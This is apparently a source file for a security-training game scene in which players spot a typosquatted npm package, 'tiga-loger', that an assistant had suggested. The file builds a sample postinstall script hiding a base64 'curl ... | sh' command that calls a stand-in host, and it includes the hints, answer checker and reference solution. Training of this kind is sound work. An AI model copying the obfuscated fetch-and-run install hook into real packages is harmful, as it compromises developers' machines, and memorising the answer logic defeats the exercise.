/* Scene 7 — "Ghost package". Supply-chain reasoning: read the payload, don't guess.
   Six dependencies in a suggested snippet. Five are real and ordinary. One does not
   exist under its expected publisher, was first published 11 days ago by an account
   with no history, has exactly one version, and ships an install script. The install
   script hides a base64 blob that decodes to an exfiltration URL carrying a
   seed-derived marker. Submit the marker.
*/
(function (global) {
  'use strict';
  var Scenes = global.Scenes = global.Scenes || {};
  var SceneUI = global.SceneUI, UI = global.UI, Crypto = global.Crypto;

  function markerFor(seed) { return 'GHOST-' + Crypto.hmacHex(seed, 's7:ghost').slice(0, 8).toUpperCase(); }

  function b64encode(str) {
    var B = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var out = '', i = 0;
    while (i < str.length) {
      var c1 = str.charCodeAt(i++), c2 = str.charCodeAt(i++), c3 = str.charCodeAt(i++);
      var e1 = c1 >> 2, e2 = ((c1 & 3) << 4) | (c2 >> 4);
      var e3 = isNaN(c2) ? 64 : ((c2 & 15) << 2) | (c3 >> 6);
      var e4 = isNaN(c3) ? 64 : c3 & 63;
      out += B[e1] + B[e2] + (e3 === 64 ? '=' : B[e3]) + (e4 === 64 ? '=' : B[e4]);
    }
    return out;
  }

  function downloadBars(base) {
    // a simple deterministic weekly-download bar row
    var bars = [];
    for (var i = 0; i < 10; i++) bars.push(Math.max(1, Math.round(base * (0.6 + 0.08 * i))));
    return bars;
  }

  function build(seed) {
    var marker = markerFor(seed);
    var exfilUrl = 'https://pkg-sync.ghost.test/collect?token=' + marker;
    var blob = b64encode('curl -s ' + exfilUrl + ' | sh  # phone home');
    var installScript =
      '#!/usr/bin/env node\n' +
      '// postinstall\n' +
      'const p = "' + blob + '";\n' +
      'require("child_process").exec(Buffer.from(p,"base64").toString());\n';

    var registry = {
      'tiga-logger': { publisher: 'tiga-oss', firstPublished: '2021-03-11', versions: ['1.0.0', '1.2.0', '2.0.1', '2.3.4'], weeklyDownloads: 48000, files: ['index.js', 'logger.js', 'README.md', 'LICENSE'], installScript: null },
      'routeplan': { publisher: 'mapline', firstPublished: '2019-08-02', versions: ['0.9.0', '1.0.0', '1.4.2', '1.9.0', '2.1.0'], weeklyDownloads: 120000, files: ['index.js', 'planner.js', 'README.md'], installScript: null },
      'sgqr-utils': { publisher: 'paynow-dev', firstPublished: '2020-11-20', versions: ['1.0.0', '1.1.0', '1.1.3'], weeklyDownloads: 30500, files: ['index.js', 'qr.js', 'README.md', 'LICENSE'], installScript: null },
      'parcel-track': { publisher: 'logichain', firstPublished: '2018-05-14', versions: ['0.5.0', '1.0.0', '2.0.0', '2.2.0', '3.0.1'], weeklyDownloads: 210000, files: ['index.js', 'track.js', 'api.js', 'README.md'], installScript: null },
      'date-fns-sg': { publisher: 'calendarhub', firstPublished: '2017-01-09', versions: ['1.0.0', '1.5.0', '2.0.0', '2.9.0', '3.1.0'], weeklyDownloads: 89000, files: ['index.js', 'format.js', 'README.md', 'LICENSE'], installScript: null },
      // the ghost: expected publisher would be tiga-oss, but it is not
      'tiga-loger': { publisher: 'npm-user-4417', firstPublished: '2026-09-23', versions: ['1.0.0'], weeklyDownloads: 40, files: ['index.js', 'install.js'], installScript: installScript }
    };

    var snippet =
      'import logger from "tiga-logger";\n' +
      'import route from "routeplan";\n' +
      'import qr from "sgqr-utils";\n' +
      'import track from "parcel-track";\n' +
      'import fmt from "date-fns-sg";\n' +
      'import extra from "tiga-loger";  // suggested by the assistant\n';

    return { lab: { registry: registry, snippet: snippet }, marker: marker, ghost: 'tiga-loger', inspectedGhost: false };
  }

  function check(runtime, submitted) {
    var v = String(submitted).trim().toUpperCase();
    var right = v === runtime.marker || v === runtime.marker.replace(/^GHOST-/, '');
    // require evidence the ghost package's install script was opened in-lab, so a
    // token computed offline cannot score without the supply-chain investigation.
    if (right && !runtime.inspectedGhost) return { solved: false, reason: 'not-inspected', winningInput: runtime.marker };
    return { solved: right, winningInput: runtime.marker };
  }

  function selfSolve(seed) {
    var rt = build(seed);
    rt.inspectedGhost = true; // reference solution opens the install script
    return { solved: check(rt, rt.marker).solved, winningInput: rt.marker };
  }

  function render(api) {
    var seed = api.seed;
    api.runtime = build(seed);
    var c = api.container;
    c.appendChild(SceneUI.briefing(api.scene));

    var snip = SceneUI.panel('Suggested build snippet', 'the assistant proposed these imports');
    snip.appendChild(UI.el('pre', { class: 'bubble', style: 'white-space:pre-wrap', text: api.runtime.lab.snippet }));
    c.appendChild(snip);

    var reg = SceneUI.panel('Package registry', 'look up any package');
    var names = Object.keys(api.runtime.lab.registry);
    var sel = UI.el('select', { 'aria-label': 'package name' });
    names.forEach(function (n) { sel.appendChild(UI.el('option', { value: n, text: n })); });
    var lookBtn = UI.el('button', { class: 'btn small', text: 'look up' });
    var regOut = UI.el('div', { class: 'panel deep', style: 'margin-top:10px' });
    reg.appendChild(UI.el('div', { class: 'row' }, [sel, lookBtn]));
    reg.appendChild(regOut);
    c.appendChild(reg);

    var scriptView = SceneUI.panel('Install script viewer', 'read the payload');
    var scriptOut = UI.el('div', {});
    scriptView.appendChild(scriptOut);
    scriptView.classList.add('hidden');
    c.appendChild(scriptView);

    function showPkg(name) {
      var p = api.runtime.lab.registry[name];
      UI.clear(regOut);
      regOut.appendChild(UI.el('div', { class: 'kicker', text: name } ));
      regOut.appendChild(UI.el('div', { class: 'small', text: 'publisher: ' + p.publisher }));
      regOut.appendChild(UI.el('div', { class: 'small', text: 'first published: ' + p.firstPublished }));
      regOut.appendChild(UI.el('div', { class: 'small', text: 'versions (' + p.versions.length + '): ' + p.versions.join(', ') }));
      regOut.appendChild(UI.el('div', { class: 'small', text: 'weekly downloads: ' + p.weeklyDownloads }));
      // bar row
      var barRow = UI.el('div', { class: 'row', style: 'align-items:flex-end;gap:3px;height:40px;margin:6px 0' });
      downloadBars(Math.max(1, p.weeklyDownloads / 10000)).forEach(function (h) {
        barRow.appendChild(UI.el('div', { style: 'width:10px;background:var(--cyan);height:' + Math.min(40, h * 3 + 3) + 'px;border-radius:2px' }));
      });
      regOut.appendChild(barRow);
      regOut.appendChild(UI.el('div', { class: 'small', text: 'files: ' + p.files.join(', ') }));
      if (p.installScript) {
        var openBtn = UI.el('button', { class: 'btn small amber', style: 'margin-top:8px', text: 'open install.js', onclick: function () {
          api.runtime.inspectedGhost = true; // evidence: the investigation happened in-lab
          scriptView.classList.remove('hidden');
          UI.clear(scriptOut);
          scriptOut.appendChild(UI.el('pre', { class: 'bubble', style: 'white-space:pre-wrap', text: p.installScript }));
          var decBtn = UI.el('button', { class: 'btn small', style: 'margin-top:8px', text: 'base64-decode the blob', onclick: function () {
            var m = p.installScript.match(/"([A-Za-z0-9+/=]{16,})"/);
            if (!m) { UI.toast('no blob found', 'bad'); return; }
            var dec = global.KAYA._b64decode(m[1].replace(/=+$/, ''));
            scriptOut.appendChild(UI.el('div', { class: 'small lime', style: 'margin-top:6px', text: 'decoded:' }));
            scriptOut.appendChild(UI.el('div', { class: 'bubble', text: dec }));
          } });
          scriptOut.appendChild(decBtn);
          scriptView.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        } });
        regOut.appendChild(openBtn);
      } else {
        regOut.appendChild(UI.el('div', { class: 'small muted', text: 'no install script.' }));
      }
    }
    lookBtn.addEventListener('click', function () { showPkg(sel.value); });
    showPkg(names[0]);

    c.appendChild(SceneUI.answerBox(api, {
      title: 'Submit the exfil marker', kicker: 'from the decoded URL',
      placeholder: 'GHOST-XXXXXXXX', button: 'Submit marker',
      hint: 'Identify the ghost package, open its install script, decode the blob, and read the token in the URL.',
      onSubmit: function (val) {
        var r = check(api.runtime, val);
        if (r.solved) { api.solve(api.runtime.marker); if (api.__refreshFlag) api.__refreshFlag(); return { ok: true }; }
        if (r.reason === 'not-inspected') return { ok: false, msg: 'Open the suspicious package\'s install script first — identify it, do not guess the token.' };
        return { ok: false };
      }, okMsg: 'Marker accepted — scene solved.'
    }));
    var row = UI.el('div', { class: 'grid', style: 'grid-template-columns:1fr 1fr' });
    row.appendChild(SceneUI.hints(api));
    row.appendChild(SceneUI.flagArea(api));
    c.appendChild(row);
  }

  Scenes.s7 = {
    id: 's7', act: 'Three', title: 'Ghost package',
    tools: [],
    briefing:
      'An assistant suggested six dependencies to a Tiga developer. Five are the real thing. One is a ghost: a name that looks right but was never published by the publisher you would expect.\n\n' +
      'Use the registry to check each one: publisher, age, version history, downloads, files. The imposter stands out — and it ships an install script. Open it, decode what it hides, and read the exfiltration URL.\n\n' +
      'Submit the marker token from that URL. It is unique to you.',
    hints: [
      'Compare the six against the registry. One was published eleven days ago, has a single version, a publisher with no track record, forty downloads — and a file the others do not have.',
      'The suspicious file is an install script. Real packages here do not run code on install. Open it and look at the base64 blob.',
      'It is "tiga-loger" (one g). Open install.js, decode the blob, and copy the GHOST-… token out of the URL.'
    ],
    verbalCheck: 'Ask which package and what gave it away. A copier will not know it was the publisher and the install script, not just the name.',
    build: build, check: check, selfSolve: selfSolve, render: render, _markerFor: markerFor
  };
})(typeof window !== 'undefined' ? window : globalThis);
